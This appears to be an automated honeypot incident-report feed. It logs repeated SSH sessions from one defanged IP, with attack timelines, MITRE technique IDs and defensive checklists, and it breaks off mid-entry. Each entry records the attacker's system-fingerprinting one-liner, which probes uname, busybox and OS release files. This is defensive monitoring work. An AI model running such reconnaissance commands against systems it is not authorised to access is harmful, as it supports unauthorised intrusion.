### 🔴 HIGH · IR-9c3b922948d8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:12 |
| **Last Seen** | 2026-08-07 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:12:29` | `cowrie.session.connect` |
| `2026-08-07 12:12:29` | `cowrie.client.version` |
| `2026-08-07 12:12:29` | `cowrie.client.kex` |
| `2026-08-07 12:12:31` | `cowrie.login.success` |
| `2026-08-07 12:12:33` | `cowrie.session.params` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.success` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.command.input` |
| `2026-08-07 12:12:33` | `cowrie.log.closed` |
| `2026-08-07 12:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8a973b6698e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:15 |
| **Last Seen** | 2026-08-07 12:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:15:49` | `cowrie.session.connect` |
| `2026-08-07 12:15:50` | `cowrie.client.version` |
| `2026-08-07 12:15:50` | `cowrie.client.kex` |
| `2026-08-07 12:15:51` | `cowrie.login.success` |
| `2026-08-07 12:15:52` | `cowrie.session.params` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.success` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:52` | `cowrie.command.input` |
| `2026-08-07 12:15:53` | `cowrie.log.closed` |
| `2026-08-07 12:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d9495d9568c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:17 |
| **Last Seen** | 2026-08-07 12:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:17:28` | `cowrie.session.connect` |
| `2026-08-07 12:17:29` | `cowrie.client.version` |
| `2026-08-07 12:17:29` | `cowrie.client.kex` |
| `2026-08-07 12:17:30` | `cowrie.login.success` |
| `2026-08-07 12:17:31` | `cowrie.session.params` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.success` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.command.input` |
| `2026-08-07 12:17:31` | `cowrie.log.closed` |
| `2026-08-07 12:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ffd99ee564

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:19 |
| **Last Seen** | 2026-08-07 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:19:08` | `cowrie.session.connect` |
| `2026-08-07 12:19:09` | `cowrie.client.version` |
| `2026-08-07 12:19:09` | `cowrie.client.kex` |
| `2026-08-07 12:19:10` | `cowrie.login.success` |
| `2026-08-07 12:19:11` | `cowrie.session.params` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.success` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.command.input` |
| `2026-08-07 12:19:11` | `cowrie.log.closed` |
| `2026-08-07 12:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b191b7544e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:20 |
| **Last Seen** | 2026-08-07 12:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:20:49` | `cowrie.session.connect` |
| `2026-08-07 12:20:49` | `cowrie.client.version` |
| `2026-08-07 12:20:49` | `cowrie.client.kex` |
| `2026-08-07 12:20:51` | `cowrie.login.success` |
| `2026-08-07 12:20:52` | `cowrie.session.params` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.success` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:52` | `cowrie.command.input` |
| `2026-08-07 12:20:53` | `cowrie.log.closed` |
| `2026-08-07 12:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b42a270e5d7b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:22 |
| **Last Seen** | 2026-08-07 12:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:22:34` | `cowrie.session.connect` |
| `2026-08-07 12:22:34` | `cowrie.client.version` |
| `2026-08-07 12:22:34` | `cowrie.client.kex` |
| `2026-08-07 12:22:36` | `cowrie.login.success` |
| `2026-08-07 12:22:36` | `cowrie.session.params` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.success` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:36` | `cowrie.command.input` |
| `2026-08-07 12:22:37` | `cowrie.log.closed` |
| `2026-08-07 12:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59995b66cd0a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:24 |
| **Last Seen** | 2026-08-07 12:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:24:21` | `cowrie.session.connect` |
| `2026-08-07 12:24:21` | `cowrie.client.version` |
| `2026-08-07 12:24:21` | `cowrie.client.kex` |
| `2026-08-07 12:24:22` | `cowrie.login.success` |
| `2026-08-07 12:24:23` | `cowrie.session.params` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.success` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:23` | `cowrie.command.input` |
| `2026-08-07 12:24:24` | `cowrie.log.closed` |
| `2026-08-07 12:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b0ab02944a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:26 |
| **Last Seen** | 2026-08-07 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:26:03` | `cowrie.session.connect` |
| `2026-08-07 12:26:04` | `cowrie.client.version` |
| `2026-08-07 12:26:04` | `cowrie.client.kex` |
| `2026-08-07 12:26:05` | `cowrie.login.success` |
| `2026-08-07 12:26:06` | `cowrie.session.params` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.success` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:06` | `cowrie.command.input` |
| `2026-08-07 12:26:07` | `cowrie.log.closed` |
| `2026-08-07 12:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896b4400b8f6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:27 |
| **Last Seen** | 2026-08-07 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:27:43` | `cowrie.session.connect` |
| `2026-08-07 12:27:44` | `cowrie.client.version` |
| `2026-08-07 12:27:44` | `cowrie.client.kex` |
| `2026-08-07 12:27:45` | `cowrie.login.success` |
| `2026-08-07 12:27:47` | `cowrie.session.params` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.success` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.command.input` |
| `2026-08-07 12:27:47` | `cowrie.log.closed` |
| `2026-08-07 12:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c99ac519586

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:29 |
| **Last Seen** | 2026-08-07 12:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:29:23` | `cowrie.session.connect` |
| `2026-08-07 12:29:23` | `cowrie.client.version` |
| `2026-08-07 12:29:23` | `cowrie.client.kex` |
| `2026-08-07 12:29:24` | `cowrie.login.success` |
| `2026-08-07 12:29:26` | `cowrie.session.params` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.success` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.command.input` |
| `2026-08-07 12:29:26` | `cowrie.log.closed` |
| `2026-08-07 12:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51898149748a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:31 |
| **Last Seen** | 2026-08-07 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:31:05` | `cowrie.session.connect` |
| `2026-08-07 12:31:05` | `cowrie.client.version` |
| `2026-08-07 12:31:05` | `cowrie.client.kex` |
| `2026-08-07 12:31:06` | `cowrie.login.success` |
| `2026-08-07 12:31:07` | `cowrie.session.params` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.success` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:07` | `cowrie.command.input` |
| `2026-08-07 12:31:08` | `cowrie.log.closed` |
| `2026-08-07 12:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b38cf96e507

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:32 |
| **Last Seen** | 2026-08-07 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:32:46` | `cowrie.session.connect` |
| `2026-08-07 12:32:46` | `cowrie.client.version` |
| `2026-08-07 12:32:46` | `cowrie.client.kex` |
| `2026-08-07 12:32:47` | `cowrie.login.success` |
| `2026-08-07 12:32:49` | `cowrie.session.params` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.success` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.command.input` |
| `2026-08-07 12:32:49` | `cowrie.log.closed` |
| `2026-08-07 12:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4e16a4ffdf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:34 |
| **Last Seen** | 2026-08-07 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
